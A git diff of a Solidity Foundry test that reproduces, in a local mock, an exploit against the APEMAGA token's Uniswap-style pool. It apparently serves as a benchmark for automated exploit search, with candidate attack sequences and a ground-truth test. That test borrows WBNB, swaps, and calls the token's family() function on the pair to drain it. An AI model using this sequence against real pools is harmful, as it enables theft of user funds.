@@ -7,10 +7,10 @@ import {AttackContract} from "./AttackContract.sol";
 import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
 import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
 import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
-import {WETH} from "@utils/WETH.sol";
+import {WBNB} from "@utils/WBNB.sol";
 
 contract APEMAGATest is Test, BlockLoader {
-    WETH weth;
+    WBNB wbnb;
     APEMAGA apemaga;
     UniswapV2Pair pair;
     UniswapV2Factory factory;
@@ -18,7 +18,7 @@ contract APEMAGATest is Test, BlockLoader {
     AttackContract attackContract;
     address owner;
     address attacker;
-    address wethAddr;
+    address wbnbAddr;
     address apemagaAddr;
     address pairAddr;
     address factoryAddr;
@@ -31,22 +31,22 @@ contract APEMAGATest is Test, BlockLoader {
     uint256 kLastpair = 0;
     uint256 price0CumulativeLastpair = 924504523958275391543891579333734752;
     uint256 price1CumulativeLastpair = 90615988006238608201646154271471894632;
-    uint256 totalSupplyweth = 2854187513811339559603869;
-    uint256 balanceOfwethpair = 9146306958660137885;
-    uint256 balanceOfwethattacker = 0;
+    uint256 totalSupplywbnb = 2854187513811339559603869;
+    uint256 balanceOfwbnbpair = 9146306958660137885;
+    uint256 balanceOfwbnbattacker = 0;
     uint256 totalSupplyapemaga = 91159088068526318125;
     uint256 balanceOfapemagapair = 54765572250112844423;
     uint256 balanceOfapemagaattacker = 0;
 
     function setUp() public {
         owner = address(this);
-        weth = new WETH();
-        wethAddr = address(weth);
+        wbnb = new WBNB();
+        wbnbAddr = address(wbnb);
         apemaga = new APEMAGA("HCT", "XAI", 9, 91159088068);
         apemagaAddr = address(apemaga);
         pair = new UniswapV2Pair(
             address(apemaga),
-            address(weth),
+            address(wbnb),
             reserve0pair,
             reserve1pair,
             blockTimestampLastpair,
@@ -68,7 +68,7 @@ contract APEMAGATest is Test, BlockLoader {
         attackerAddr = address(attacker);
         attacker = address(attackContract);
         // Initialize balances and mock flashloan.
-        weth.transfer(address(pair), balanceOfwethpair);
+        wbnb.transfer(address(pair), balanceOfwbnbpair);
         apemaga.transfer(address(pair), balanceOfapemagapair);
     }
 
@@ -78,23 +78,23 @@ contract APEMAGATest is Test, BlockLoader {
 
     function printBalance(string memory tips) public {
         emit log_string(tips);
-        emit log_string("Weth Balances: ");
+        emit log_string("Wbnb Balances: ");
         queryERC20BalanceDecimals(
-            address(weth),
-            address(weth),
-            weth.decimals()
+            address(wbnb),
+            address(wbnb),
+            wbnb.decimals()
         );
         queryERC20BalanceDecimals(
             address(apemaga),
-            address(weth),
+            address(wbnb),
             apemaga.decimals()
         );
         emit log_string("");
         emit log_string("Apemaga Balances: ");
         queryERC20BalanceDecimals(
-            address(weth),
+            address(wbnb),
             address(apemaga),
-            weth.decimals()
+            wbnb.decimals()
         );
         queryERC20BalanceDecimals(
             address(apemaga),
@@ -104,9 +104,9 @@ contract APEMAGATest is Test, BlockLoader {
         emit log_string("");
         emit log_string("Pair Balances: ");
         queryERC20BalanceDecimals(
-            address(weth),
+            address(wbnb),
             address(pair),
-            weth.decimals()
+            wbnb.decimals()
         );
         queryERC20BalanceDecimals(
             address(apemaga),
@@ -116,9 +116,9 @@ contract APEMAGATest is Test, BlockLoader {
         emit log_string("");
         emit log_string("Attacker Balances: ");
         queryERC20BalanceDecimals(
-            address(weth),
+            address(wbnb),
             address(attacker),
-            weth.decimals()
+            wbnb.decimals()
         );
         queryERC20BalanceDecimals(
             address(apemaga),
@@ -131,18 +131,18 @@ contract APEMAGATest is Test, BlockLoader {
     }
 
     function attackGoal() public view returns (bool) {
-        return weth.balanceOf(attacker) >= 1e12 + balanceOfwethattacker;
+        return wbnb.balanceOf(attacker) >= 1e12 + balanceOfwbnbattacker;
     }
 
-    function borrow_weth_owner(uint256 amount) internal eurus {
+    function borrow_wbnb_owner(uint256 amount) internal eurus {
         vm.stopPrank();
         vm.prank(owner);
-        weth.transfer(attacker, amount);
+        wbnb.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
 
-    function payback_weth_owner(uint256 amount) internal eurus {
-        weth.transfer(owner, amount);
+    function payback_wbnb_owner(uint256 amount) internal eurus {
+        wbnb.transfer(owner, amount);
     }
 
     function borrow_apemaga_owner(uint256 amount) internal eurus {
@@ -156,7 +156,7 @@ contract APEMAGATest is Test, BlockLoader {
         apemaga.transfer(owner, amount);
     }
 
-    function swap_pair_attacker_apemaga_weth(
+    function swap_pair_attacker_apemaga_wbnb(
         uint256 amount,
         uint256 amountOut
     ) internal eurus {
@@ -164,12 +164,16 @@ contract APEMAGATest is Test, BlockLoader {
         pair.swap(0, amountOut, attacker, new bytes(0));
     }
 
-    function swap_pair_attacker_weth_apemaga(
+    function swap_pair_attacker_wbnb_apemaga(
         uint256 amount,
         uint256 amountOut
     ) internal eurus {
-        weth.transfer(address(pair), amount);
+        wbnb.transfer(address(pair), amount);
         pair.swap(amountOut, 0, attacker, new bytes(0));
+    }
+
+    function burn_apemaga_pair(uint256 amount) internal eurus {
+        apemaga.family(address(pair));
     }
 
     function check_cand000(
@@ -182,11 +186,11 @@ contract APEMAGATest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt5 >= amt0);
-        borrow_weth_owner(amt0);
-        swap_pair_attacker_weth_apemaga(amt1, amt2);
-        swap_pair_attacker_apemaga_weth(amt3, amt4);
-        payback_weth_owner(amt5);
-        assert(!attackGoal());
+        borrow_wbnb_owner(amt0);
+        swap_pair_attacker_wbnb_apemaga(amt1, amt2);
+        swap_pair_attacker_apemaga_wbnb(amt3, amt4);
+        payback_wbnb_owner(amt5);
+        require(!attackGoal(), "Attack failed!");
         vm.stopPrank();
     }
 
@@ -196,15 +200,17 @@ contract APEMAGATest is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3,
         uint256 amt4,
-        uint256 amt5
+        uint256 amt5,
+        uint256 amt6
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt5 >= amt0);
-        borrow_apemaga_owner(amt0);
-        swap_pair_attacker_apemaga_weth(amt1, amt2);
-        swap_pair_attacker_weth_apemaga(amt3, amt4);
-        payback_apemaga_owner(amt5);
-        assert(!attackGoal());
+        vm.assume(amt6 >= amt0);
+        borrow_wbnb_owner(amt0);
+        burn_apemaga_pair(amt1);
+        swap_pair_attacker_wbnb_apemaga(amt2, amt3);
+        swap_pair_attacker_apemaga_wbnb(amt4, amt5);
+        payback_wbnb_owner(amt6);
+        require(!attackGoal(), "Attack failed!");
         vm.stopPrank();
     }
 
@@ -215,6 +221,84 @@ contract APEMAGATest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4,
         uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt6 >= amt0);
+        borrow_wbnb_owner(amt0);
+        swap_pair_attacker_wbnb_apemaga(amt1, amt2);
+        burn_apemaga_pair(amt3);
+        swap_pair_attacker_apemaga_wbnb(amt4, amt5);
+        payback_wbnb_owner(amt6);
+        require(!attackGoal(), "Attack failed!");
+        vm.stopPrank();
+    }
+
+    function check_cand003(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt5 >= amt0);
+        borrow_apemaga_owner(amt0);
+        swap_pair_attacker_apemaga_wbnb(amt1, amt2);
+        swap_pair_attacker_wbnb_apemaga(amt3, amt4);
+        payback_apemaga_owner(amt5);
+        require(!attackGoal(), "Attack failed!");
+        vm.stopPrank();
+    }
+
+    function check_cand004(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt6 >= amt0);
+        borrow_apemaga_owner(amt0);
+        burn_apemaga_pair(amt1);
+        swap_pair_attacker_apemaga_wbnb(amt2, amt3);
+        swap_pair_attacker_wbnb_apemaga(amt4, amt5);
+        payback_apemaga_owner(amt6);
+        require(!attackGoal(), "Attack failed!");
+        vm.stopPrank();
+    }
+
+    function check_cand005(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt6 >= amt0);
+        borrow_apemaga_owner(amt0);
+        swap_pair_attacker_apemaga_wbnb(amt1, amt2);
+        burn_apemaga_pair(amt3);
+        swap_pair_attacker_wbnb_apemaga(amt4, amt5);
+        payback_apemaga_owner(amt6);
+        require(!attackGoal(), "Attack failed!");
+        vm.stopPrank();
+    }
+
+    function check_cand006(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
         uint256 amt6,
         uint256 amt7,
         uint256 amt8,
@@ -222,17 +306,121 @@ contract APEMAGATest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt9 >= amt0);
-        borrow_weth_owner(amt0);
-        swap_pair_attacker_weth_apemaga(amt1, amt2);
-        swap_pair_attacker_apemaga_weth(amt3, amt4);
-        swap_pair_attacker_weth_apemaga(amt5, amt6);
-        swap_pair_attacker_apemaga_weth(amt7, amt8);
-        payback_weth_owner(amt9);
-        assert(!attackGoal());
+        borrow_wbnb_owner(amt0);
+        swap_pair_attacker_wbnb_apemaga(amt1, amt2);
+        swap_pair_attacker_apemaga_wbnb(amt3, amt4);
+        swap_pair_attacker_wbnb_apemaga(amt5, amt6);
+        swap_pair_attacker_apemaga_wbnb(amt7, amt8);
+        payback_wbnb_owner(amt9);
+        require(!attackGoal(), "Attack failed!");
         vm.stopPrank();
     }
 
-    function check_cand003(
+    function check_cand007(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_wbnb_owner(amt0);
+        burn_apemaga_pair(amt1);
+        swap_pair_attacker_wbnb_apemaga(amt2, amt3);
+        swap_pair_attacker_apemaga_wbnb(amt4, amt5);
+        swap_pair_attacker_wbnb_apemaga(amt6, amt7);
+        swap_pair_attacker_apemaga_wbnb(amt8, amt9);
+        payback_wbnb_owner(amt10);
+        require(!attackGoal(), "Attack failed!");
+        vm.stopPrank();
+    }
+
+    function check_cand008(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_wbnb_owner(amt0);
+        swap_pair_attacker_wbnb_apemaga(amt1, amt2);
+        burn_apemaga_pair(amt3);
+        swap_pair_attacker_apemaga_wbnb(amt4, amt5);
+        swap_pair_attacker_wbnb_apemaga(amt6, amt7);
+        swap_pair_attacker_apemaga_wbnb(amt8, amt9);
+        payback_wbnb_owner(amt10);
+        require(!attackGoal(), "Attack failed!");
+        vm.stopPrank();
+    }
+
+    function check_cand009(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_wbnb_owner(amt0);
+        swap_pair_attacker_wbnb_apemaga(amt1, amt2);
+        swap_pair_attacker_apemaga_wbnb(amt3, amt4);
+        burn_apemaga_pair(amt5);
+        swap_pair_attacker_wbnb_apemaga(amt6, amt7);
+        swap_pair_attacker_apemaga_wbnb(amt8, amt9);
+        payback_wbnb_owner(amt10);
+        require(!attackGoal(), "Attack failed!");
+        vm.stopPrank();
+    }
+
+    function check_cand010(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_wbnb_owner(amt0);
+        swap_pair_attacker_wbnb_apemaga(amt1, amt2);
+        swap_pair_attacker_apemaga_wbnb(amt3, amt4);
+        swap_pair_attacker_wbnb_apemaga(amt5, amt6);
+        burn_apemaga_pair(amt7);
+        swap_pair_attacker_apemaga_wbnb(amt8, amt9);
+        payback_wbnb_owner(amt10);
+        require(!attackGoal(), "Attack failed!");
+        vm.stopPrank();
+    }
+
+    function check_cand011(
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
@@ -247,27 +435,169 @@ contract APEMAGATest is Test, BlockLoader {
         vm.startPrank(attacker);
         vm.assume(amt9 >= amt0);
         borrow_apemaga_owner(amt0);
-        swap_pair_attacker_apemaga_weth(amt1, amt2);
-        swap_pair_attacker_weth_apemaga(amt3, amt4);
-        swap_pair_attacker_apemaga_weth(amt5, amt6);
-        swap_pair_attacker_weth_apemaga(amt7, amt8);
+        swap_pair_attacker_apemaga_wbnb(amt1, amt2);
+        swap_pair_attacker_wbnb_apemaga(amt3, amt4);
+        swap_pair_attacker_apemaga_wbnb(amt5, amt6);
+        swap_pair_attacker_wbnb_apemaga(amt7, amt8);
         payback_apemaga_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack failed!");
+        vm.stopPrank();
+    }
+
+    function check_cand012(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_apemaga_owner(amt0);
+        burn_apemaga_pair(amt1);
+        swap_pair_attacker_apemaga_wbnb(amt2, amt3);
+        swap_pair_attacker_wbnb_apemaga(amt4, amt5);
+        swap_pair_attacker_apemaga_wbnb(amt6, amt7);
+        swap_pair_attacker_wbnb_apemaga(amt8, amt9);
+        payback_apemaga_owner(amt10);
+        require(!attackGoal(), "Attack failed!");
+        vm.stopPrank();
+    }
+
+    function check_cand013(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_apemaga_owner(amt0);
+        swap_pair_attacker_apemaga_wbnb(amt1, amt2);
+        burn_apemaga_pair(amt3);
+        swap_pair_attacker_wbnb_apemaga(amt4, amt5);
+        swap_pair_attacker_apemaga_wbnb(amt6, amt7);
+        swap_pair_attacker_wbnb_apemaga(amt8, amt9);
+        payback_apemaga_owner(amt10);
+        require(!attackGoal(), "Attack failed!");
+        vm.stopPrank();
+    }
+
+    function check_cand014(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_apemaga_owner(amt0);
+        swap_pair_attacker_apemaga_wbnb(amt1, amt2);
+        swap_pair_attacker_wbnb_apemaga(amt3, amt4);
+        burn_apemaga_pair(amt5);
+        swap_pair_attacker_apemaga_wbnb(amt6, amt7);
+        swap_pair_attacker_wbnb_apemaga(amt8, amt9);
+        payback_apemaga_owner(amt10);
+        require(!attackGoal(), "Attack failed!");
+        vm.stopPrank();
+    }
+
+    function check_cand015(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_apemaga_owner(amt0);
+        swap_pair_attacker_apemaga_wbnb(amt1, amt2);
+        swap_pair_attacker_wbnb_apemaga(amt3, amt4);
+        swap_pair_attacker_apemaga_wbnb(amt5, amt6);
+        burn_apemaga_pair(amt7);
+        swap_pair_attacker_wbnb_apemaga(amt8, amt9);
+        payback_apemaga_owner(amt10);
+        require(!attackGoal(), "Attack failed!");
         vm.stopPrank();
     }
 
     function test_gt() public {
         vm.startPrank(attacker);
-        borrow_weth_owner(2200 * 1e18);
+        emit log_named_uint("amt0", 2200 * 1e18);
+        borrow_wbnb_owner(2200 * 1e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", wbnb.balanceOf(attacker));
+        emit log_named_uint(
+            "amt2",
+            (pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb)) * 99) /
+                100
+        );
+        swap_pair_attacker_wbnb_apemaga(
+            wbnb.balanceOf(attacker),
+            (pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb)) * 99) /
+                100
+        );
+        printBalance("After step1 ");
+        emit log_named_uint("amt3", 0);
+        burn_apemaga_pair(0);
+        printBalance("After step2 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
     }
 
-    function check_gt(uint256 amt0) public {
+    function check_gt(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3
+    ) public {
         vm.startPrank(attacker);
-        vm.assume(amt0 >= amt0);
-        borrow_weth_owner(amt0);
+        vm.assume(amt3 >= amt0);
+        borrow_wbnb_owner(amt0);
+        swap_pair_attacker_wbnb_apemaga(amt1, amt2);
+        burn_apemaga_pair(amt3);
+        require(!attackGoal(), "Attack failed!");
+        vm.stopPrank();
+    }
+
+    function check_gt_halmos(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt3 >= amt0);
+        borrow_wbnb_owner(amt0);
+        swap_pair_attacker_wbnb_apemaga(amt1, amt2);
+        burn_apemaga_pair(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
